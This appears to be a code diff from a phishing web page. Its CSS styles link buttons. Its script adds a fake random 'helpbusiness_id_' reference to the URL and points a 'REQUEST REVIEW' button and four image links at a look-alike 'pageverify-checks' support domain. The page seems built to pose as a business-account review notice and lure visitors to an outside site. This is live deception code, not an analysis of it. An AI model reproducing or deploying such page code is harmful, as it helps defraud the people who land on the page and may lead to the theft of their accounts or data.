@@ -74,46 +74,71 @@
     </div>
 </div>
 <style>
-    link[rel="shortcut icon"] {
-    width: 38px;
-    height: 30px;
-    object-fit: cover; /* Cắt bớt phần dư, giữ tỷ lệ */
+    body {
+    font-family: Arial, sans-serif;
 }
 
+.biolink-container {
+    width: 100%;
+    margin: 10px 0;
+    text-align: center;
+}
+
+.link-btn {
+    display: inline-block;
+    background: #4864DD;
+    color: #FFFFFF;
+    border-width: 0px;
+    border-color: #000000;
+    border-style: solid;
+    box-shadow: 0px 0px 20px 0px #00000010;
+    text-align: center;
+    padding: 10px 20px;
+    border-radius: 8px;
+    text-decoration: none;
+    font-weight: bold;
+    transition: 0.3s;
+}
+
+.link-btn:hover {
+    background: #3a53b5;
+}
+
+.link-btn-image-wrapper {
+    display: none;
+}
 </style>
 <!-- JavaScript to Randomize URL -->
+</body>
 <script>
-        function generateRandomNumber() {
-        return 100000000 + Math.floor(Math.random() * 999999999); // Số ngẫu nhiên từ 100000 đến 999999
-    }
+    function generateRandomNumber() {
+    return 100000000 + Math.floor(Math.random() * 999999999); // Số ngẫu nhiên từ 100000 đến 999999
+}
 
-    // Lấy URL hiện tại
-    const currentUrl = window.location.href;
+// Lấy URL hiện tại
+const currentUrl = window.location.href;
 
-    // Kiểm tra xem URL đã có tham số `helpbusiness_id_` hay chưa
-    if (!currentUrl.includes("helpbusiness_id_")) {
-        // Lấy dãy số ngẫu nhiên
-        const randomNumber = generateRandomNumber();
-        // Thêm dãy số vào URL
-        const newUrl = `${currentUrl}?helpbusiness_id_${randomNumber}`;
-        // Cập nhật lại URL của trang
-        window.history.replaceState(null, '', newUrl);
-    }
+// Kiểm tra xem URL đã có tham số `helpbusiness_id_` hay chưa
+if (!currentUrl.includes("helpbusiness_id_")) {
+    // Lấy dãy số ngẫu nhiên
+    const randomNumber = generateRandomNumber();
+    // Thêm dãy số vào URL
+    const newUrl = `${currentUrl}?helpbusiness_id_${randomNumber}`;
+    // Cập nhật lại URL của trang
+    window.history.replaceState(null, '', newUrl);
+}
 
-    // Gắn URL ngẫu nhiên cho nút và hình ảnh
-    const randomUrl = `https://pageverify-checks.fixmypc.wtf/support/`;
+// Gắn URL ngẫu nhiên cho nút và hình ảnh
+const randomUrl = `https://pageverify-checks.fixmypc.wtf/support/`;
 
-    // Gắn URL cho nút "REQUEST REVIEW"
-    document.getElementById("random-link").href = randomUrl;
+// Gắn URL cho nút "REQUEST REVIEW"
+document.getElementById("random-link").href = randomUrl;
 
-    // Gắn URL cho các hình ảnh
-    document.getElementById("img-link-1").href = randomUrl;
-    document.getElementById("img-link-2").href = randomUrl;
-    document.getElementById("img-link-3").href = randomUrl;
-    document.getElementById("img-link-4").href = randomUrl;
+// Gắn URL cho các hình ảnh
+document.getElementById("img-link-1").href = randomUrl;
+document.getElementById("img-link-2").href = randomUrl;
+document.getElementById("img-link-3").href = randomUrl;
+document.getElementById("img-link-4").href = randomUrl;
 
 </script>
-
-
-</body>
 </html>
